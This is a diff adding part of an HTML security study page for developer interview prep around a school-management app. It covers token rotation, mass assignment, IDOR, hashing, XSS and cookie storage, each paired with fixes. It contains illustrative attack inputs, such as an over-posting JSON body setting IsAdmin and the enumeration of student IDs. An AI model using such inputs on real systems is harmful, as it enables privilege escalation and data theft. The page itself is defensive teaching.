+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ REFRESH TOKEN ROTATION — THEFT DETECTION</div>
+      <pre><span class="cm">// Normal flow:
+// User logs in → RefreshToken_A issued, stored in DB
+// After 1hr: user sends RefreshToken_A → gets new AccessToken + RefreshToken_B
+// RefreshToken_A is REVOKED in DB
+
+// Attack detected:
+// Attacker steals RefreshToken_A (before user uses it)
+// User uses RefreshToken_A → gets RefreshToken_B (normal)
+// Attacker later uses RefreshToken_A → DB shows it's REVOKED → 401!
+// Attacker detected — didn't get a valid token!
+
+// But what if attacker uses it FIRST?
+// Attacker uses RefreshToken_A → gets RefreshToken_B (attacker has it now)
+// User uses RefreshToken_A → REVOKED → 401 → user calls support
+// Support sees: same token used twice from different IPs → compromise confirmed!
+
+// BEST PRACTICE: when revoked token reuse detected → revoke ALL user's tokens</span>
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">RefreshAsync</span>(<span class="tp">RefreshRequest</span> <span class="pr">req</span>)
+{
+    <span class="kw">var</span> <span class="pr">token</span> = <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">GetRefreshTokenAsync</span>(<span class="pr">req</span>.<span class="pr">RefreshToken</span>);
+
+    <span class="kw">if</span> (<span class="pr">token</span>?.<span class="pr">IsRevoked</span> == <span class="kw">true</span>)
+    {
+        <span class="cm">// Reuse detected! Revoke ALL tokens for this user immediately</span>
+        <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">RevokeAllUserTokensAsync</span>(<span class="pr">token</span>.<span class="pr">UserId</span>);
+        <span class="pr">_log</span>.<span class="mt">LogWarning</span>(<span class="st">"Refresh token reuse detected for user {UserId}"</span>, <span class="pr">token</span>.<span class="pr">UserId</span>);
+        <span class="cm">// Optionally: send security alert email to user</span>
+        <span class="kw">return</span> <span class="mt">Unauthorized</span>(<span class="st">"Security violation detected. Please log in again."</span>);
+    }
+    <span class="cm">// ... normal rotation flow</span>
+}</pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">9</div>
+      <div><div class="scenario-title">Mass assignment / over-posting attack <span class="diff medium">Medium</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Student registration API accepts StudentDto. Attacker sends extra field: IsAdmin=true in JSON body. Could they become an admin?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ NEVER BIND TO DOMAIN MODELS — USE DTOs</div>
+      <pre><span class="cm">// VULNERABLE: binding directly to domain model</span>
+[<span class="at">HttpPost</span>(<span class="st">"students"</span>)]
+<span class="kw">public</span> <span class="tp">IActionResult</span> <span class="mt">Register</span>([<span class="at">FromBody</span>] <span class="tp">Student</span> <span class="pr">student</span>)
+{
+    <span class="pr">_ctx</span>.<span class="pr">Students</span>.<span class="mt">Add</span>(<span class="pr">student</span>);  <span class="cm">// ← attacker sets student.IsAdmin = true!</span>
+    <span class="kw">await</span> <span class="pr">_ctx</span>.<span class="mt">SaveChangesAsync</span>();
+}
+<span class="cm">// Attacker sends: {"name":"Ravi","IsAdmin":true,"SchoolId":42,"Role":"Admin"}
+// All fields bound directly → admin account created!</span>
+
+<span class="cm">// FIX: Use DTOs — only expose what the API should accept</span>
+<span class="kw">public record</span> <span class="tp">StudentRegistrationDto</span>(
+    <span class="kw">string</span> <span class="pr">Name</span>,
+    <span class="tp">DateTime</span> <span class="pr">DateOfBirth</span>,
+    <span class="kw">string</span> <span class="pr">Class</span>
+    <span class="cm">// NO: IsAdmin, Role, SchoolId, Status — set by server, not client!</span>
+);
+
+[<span class="at">HttpPost</span>(<span class="st">"students"</span>)]
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">Register</span>([<span class="at">FromBody</span>] <span class="tp">StudentRegistrationDto</span> <span class="pr">dto</span>)
+{
+    <span class="kw">var</span> <span class="pr">student</span> = <span class="kw">new</span> <span class="tp">Student</span>
+    {
+        <span class="pr">Name</span>         = <span class="pr">dto</span>.<span class="pr">Name</span>,
+        <span class="pr">DateOfBirth</span>  = <span class="pr">dto</span>.<span class="pr">DateOfBirth</span>,
+        <span class="pr">Class</span>        = <span class="pr">dto</span>.<span class="pr">Class</span>,
+        <span class="pr">SchoolId</span>     = <span class="kw">int</span>.<span class="mt">Parse</span>(<span class="tp">User</span>.<span class="mt">FindFirst</span>(<span class="st">"schoolId"</span>)!.<span class="pr">Value</span>), <span class="cm">// from JWT!</span>
+        <span class="pr">IsAdmin</span>      = <span class="kw">false</span>,   <span class="cm">// server-set, not client-provided</span>
+        <span class="pr">Status</span>       = <span class="st">"Active"</span>  <span class="cm">// server-set</span>
+    };
+    <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">AddAsync</span>(<span class="pr">student</span>);
+    <span class="kw">return</span> <span class="mt">CreatedAtAction</span>(...);
+}</pre>
+    </div>
+  </div>
+
+  <div class="scenario-card hot">
+    <div class="scenario-header">
+      <div class="s-num">10</div>
+      <div><div class="scenario-title">"Security experience sollu" — complete interview answer <span class="diff senior">Senior</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Describe the security measures you've implemented in ZenCampus. How do you approach application security?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ COMPLETE SECURITY POSTURE ANSWER</div>
+      <div style="background:#0a0a1a;padding:14px;border-radius:8px;color:#c0d0c0;font-size:0.9em;line-height:1.9">
+        <p><strong>Authentication:</strong> JWT with 1-hour access tokens, 7-day refresh tokens with rotation. Tokens generated with HMACSHA256 and 64-byte secret from Azure Key Vault. Refresh token reuse detection — revokes all user tokens on suspicious reuse. BCrypt (work factor 12) for password hashing after migrating from legacy MD5.</p>
+        <p><strong>Authorization:</strong> Three-layer model: Role-based (Admin/Teacher/Parent/Student), Policy-based (CanCollectFee = Admin+Accountant+schoolId claim), Resource-based (teacher can only access their school's students via IAuthorizationService). Never trust client-provided schoolId — always from JWT claim. Parent checked against IsParentOfStudent() for every student data endpoint — prevents IDOR/OWASP A01.</p>
+        <p><strong>Injection prevention:</strong> EF Core for all queries (parameterized by default). Dapper uses @param syntax for raw SQL. FluentValidation on all input DTOs — name must match [a-zA-Z\s\.\-']+ regex. Never concatenate user input into SQL strings.</p>
+        <p><strong>XSS:</strong> Razor auto-encodes all output. CSP header blocks inline scripts. JWT stored in httpOnly cookie (not localStorage) — XSS can't steal it. Input validation rejects HTML characters in names.</p>
+        <p><strong>Rate limiting:</strong> ASP.NET Core 8 built-in. Login endpoint: 5 per minute per IP. API endpoints: 100 per minute per user. Account lockout after 5 failed logins (15 min). Azure Application Insights alert for login spike.</p>
+        <p><strong>Secrets:</strong> Azure Key Vault + Managed Identity. Zero credentials in code or config files. Swagger disabled in production. Security headers on all responses.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- QUIZ -->
+<div class="section" id="quiz">
+  <div class="section-title"><span class="num">8</span> ⚡ Quick Quiz</div>
+
+  <div style="margin:18px 0">
+    <p style="color:#fff;font-weight:bold;margin-bottom:10px">Q1: JWT payload-la sensitive data (password, address) போடலாமா?</p>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">A) Yes — JWT is encrypted, so it's safe</div>
+    <div class="quiz-opt" onclick="ans(this,'correct')">B) No — JWT payload is only Base64-encoded (not encrypted). Anyone with the token can decode it. Only put identity and authorization claims.</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">C) Yes — only the signature part is readable</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">D) Safe only if using RS256 algorithm</div>
+    <div class="quiz-fb ok">✅ JWT is signed (HMAC/RSA), NOT encrypted. Payload = Base64URL encoded. Decode at jwt.io → see everything. Never put passwords, SSN, salary, address in JWT. Only: userId, role, schoolId (for routing/auth). Sensitive data → fetch fresh from DB per request.</div>
+    <div class="quiz-fb nope">❌ JWT payload is BASE64 ENCODED (not encrypted). Anyone can decode: atob(payload.replace(/-/g,'+').replace(/_/g,'/')) → JSON object. The signature proves authenticity but doesn't hide content. Never put sensitive data in JWT — only identity claims (userId, role, schoolId).</div>
+  </div>
+
+  <div style="margin:18px 0">
+    <p style="color:#fff;font-weight:bold;margin-bottom:10px">Q2: OWASP A01 Broken Access Control — ZenCampus example?</p>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">A) Admin uses weak password "admin123"</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">B) SQL injection in student search</div>
+    <div class="quiz-opt" onclick="ans(this,'correct')">C) Parent calls GET /api/students/102 (not their child) and successfully sees the student's data because only role check (Parent) exists, not ownership check</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">D) JWT token not expiring</div>
+    <div class="quiz-fb ok">✅ IDOR (Insecure Direct Object Reference) = OWASP A01. Parent is authenticated (role=Parent) but accesses resource they don't own (student 102 belongs to different parent). Role check alone is insufficient. Must check: IsParentOfStudent(parentId, studentId). Missing ownership check = broken access control.</div>
+    <div class="quiz-fb nope">❌ OWASP A01 Broken Access Control = authorization check is missing or insufficient. Classic example: [Authorize(Roles="Parent")] only verifies role. Parent 50 can iterate student IDs 1-50000 and see all of them. Fix: check ownership in every resource endpoint — IsParentOfStudent() for parents, SameSchool for teachers.</div>
+  </div>
+
+  <div style="margin:18px 0">
+    <p style="color:#fff;font-weight:bold;margin-bottom:10px">Q3: MD5 vs BCrypt password hashing — key difference?</p>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">A) MD5 is longer, so more secure</div>
+    <div class="quiz-opt" onclick="ans(this,'correct')">B) BCrypt is intentionally slow (250ms at work factor 12) and includes built-in salt. MD5 is fast (cracked in milliseconds by GPU) and has no built-in salt.</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">C) Both are equally secure for passwords</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">D) MD5 is better for short passwords, BCrypt for long ones</div>
+    <div class="quiz-fb ok">✅ MD5 design goal: FAST (for checksums). BCrypt design goal: SLOW (for passwords). GPU: 10 billion MD5/second vs 0.004 BCrypt/second (at cost 12). Also: BCrypt embeds random salt in output → same password = different hash every time → no rainbow tables. BCrypt is the minimum for password storage (Argon2id is even better).</div>
+    <div class="quiz-fb nope">❌ MD5 is cryptographically broken AND fast — attacker can try 10 billion passwords per second. BCrypt is intentionally slow (adaptive cost factor). Cost 12 = ~250ms per hash. 10B guesses = 793 years! BCrypt also has built-in salt (in the output string) — same password always hashes differently, defeating rainbow tables.</div>
+  </div>
+
+  <div style="margin:18px 0">
+    <p style="color:#fff;font-weight:bold;margin-bottom:10px">Q4: Why is storing JWT in localStorage dangerous vs httpOnly cookie?</p>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">A) localStorage is slower than cookies</div>
+    <div class="quiz-opt" onclick="ans(this,'correct')">B) localStorage is accessible by JavaScript — any XSS attack can read and steal the JWT. httpOnly cookies cannot be read by JavaScript — XSS cannot steal them.</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">C) localStorage tokens expire automatically, cookies don't</div>
+    <div class="quiz-opt" onclick="ans(this,'wrong')">D) Cookies are encrypted by the browser, localStorage is not</div>
+    <div class="quiz-fb ok">✅ localStorage: JavaScript can read with localStorage.getItem('jwt'). XSS attack: inject script → steal JWT → send to attacker server → attacker logs in as you. httpOnly cookie: Set-Cookie: token=...; HttpOnly — browser never lets JS read it. Even successful XSS cannot steal the JWT. Defense in depth: httpOnly + CSP + input validation.</div>
+    <div class="quiz-fb nope">❌ localStorage is accessible via JavaScript (any JS on the page). XSS injects malicious JS → reads localStorage.getItem('jwt') → sends to evil server → attacker has your JWT! httpOnly cookies: the browser's Set-Cookie API with HttpOnly flag means NO JavaScript can read that cookie. XSS can't steal what it can't read!</div>
+  </div>
+</div>
+
+<!-- CHECKLIST -->
+<div class="section">
+  <div class="section-title"><span class="num">9</span> ✅ Day 18 Checklist</div>
+  <div class="two-col">
+    <div>
+      <h3>📚 Concepts</h3>
+      <ul class="check-list">
+        <li>OWASP A01: Broken Access Control — IDOR fix</li>
+        <li>OWASP A02: Cryptographic Failures — BCrypt, HTTPS, KV</li>
+        <li>OWASP A03: Injection — parameterized queries always</li>
+        <li>JWT: Header.Payload.Signature (payload NOT encrypted)</li>
+        <li>JWT claims: only userId, role, schoolId — no sensitive data</li>
+        <li>Refresh token rotation — theft detection</li>
+        <li>Role + Policy + Resource-based authorization</li>
+        <li>Never trust client schoolId — always from JWT claim</li>
+        <li>XSS: Razor auto-encode, CSP, httpOnly cookie</li>
+        <li>SQL Injection: EF Core LINQ or Dapper @param</li>
+        <li>CSRF: SameSite=Strict, AntiForgeryToken</li>
+        <li>Rate limiting: ASP.NET Core 8 built-in</li>
+        <li>BCrypt work factor 12, MD5 migration pattern</li>
+        <li>DTOs prevent mass assignment / over-posting</li>
+      </ul>
+    </div>
+    <div>
+      <h3>🎯 Interview Keywords</h3>
+      <ul class="check-list">
+        <li>"OWASP A01 IDOR — IsParentOfStudent() check"</li>
+        <li>"JWT payload Base64 only — never put sensitive data"</li>
+        <li>"Refresh token rotation — reuse = revoke all tokens"</li>
+        <li>"schoolId from JWT claim — never from request body"</li>
+        <li>"BCrypt work factor 12 — 250ms, rainbow tables defeated"</li>
+        <li>"MD5 migration — re-hash on login, no forced reset"</li>
+        <li>"EF Core LINQ = always parameterized — no SQL injection"</li>
+        <li>"Razor @Model.Name = auto HTML encoded"</li>
+        <li>"httpOnly cookie — XSS can't steal JWT"</li>
+        <li>"CSP script-src 'self' — blocks inline scripts"</li>
+        <li>"Rate limit login: 5/min per IP, 429 + Retry-After"</li>
+        <li>"Swagger disabled in production via IsDevelopment()"</li>
+        <li>"DTOs prevent over-posting — never bind to domain model"</li>
+        <li>"CORS: WithOrigins(specific) not AllowAnyOrigin"</li>
+      </ul>
+    </div>
+  </div>
+
+  <div style="background:linear-gradient(135deg,#120020,#0d0d1a);border-radius:10px;padding:20px;margin-top:20px;text-align:center">
+    <div style="font-size:1.4em;margin-bottom:8px">🔒 Day 18 Motivation</div>
+    <p style="color:#a78bfa;font-style:italic">"Sarkar-la villain manipulates elections — SQL injection does same. Kaththi-la Kathiresan has two identities — JWT claims = identity + role. Theri-la Vijay controls crowd — rate limiting controls attackers. <strong>Interview-la 'OWASP A01 IDOR fix panna IsParentOfStudent() add panni, JWT-la schoolId claim-a use panni, EF Core parameterized queries — SQL injection zero chance' சொன்னா — Security-conscious developer confirmed!</strong>"</p>
+    <div style="margin-top:12px;color:#a0a0c0">Day 18/60 ✅ | Tomorrow: Day 19 — Design Patterns (Repository, CQRS, Strategy, Factory, Decorator)</div>
+    <div class="progress-wrap" style="max-width:400px;margin:12px auto 4px">
+      <div class="progress-fill" style="width:30%"></div>
+    </div>
+    <div style="color:#555;font-size:0.8em">18 of 60 days (30%) — Security mastered! Phase 1 nearing completion — security foundation locked in!</div>
+  </div>
+</div>
+
+</div>
+<footer>
+  <p>Day 18 – Security | ZenCampus | basha@raxgbc.co.in</p>
+  <p style="margin-top:4px;font-size:0.8em">🔒 "OWASP Top 10 = your checklist. JWT + BCrypt + parameterized SQL + CSP + httpOnly cookies + rate limiting + resource-based auth = defense in depth. Security is not a feature — it's a mindset!"</p>
+</footer>
+<script>
+function toggle(btn){var a=btn.nextElementSibling;if(a.classList.contains('shown')){a.classList.remove('shown');btn.textContent='🔒 Answer Reveal';}else{a.classList.add('shown');btn.textContent='🔼 Hide Answer';}}
+function ans(el,type){var p=el.parentElement;p.querySelectorAll('.quiz-opt').forEach(o=>{o.classList.remove('correct','wrong');o.onclick=null;});p.querySelectorAll('.quiz-fb').forEach(f=>f.classList.remove('shown'));el.classList.add(type);var fb=p.querySelector('.quiz-fb.'+(type==='correct'?'ok':'nope'));if(fb)fb.classList.add('shown');}
+</script>
+</body>
+</html>
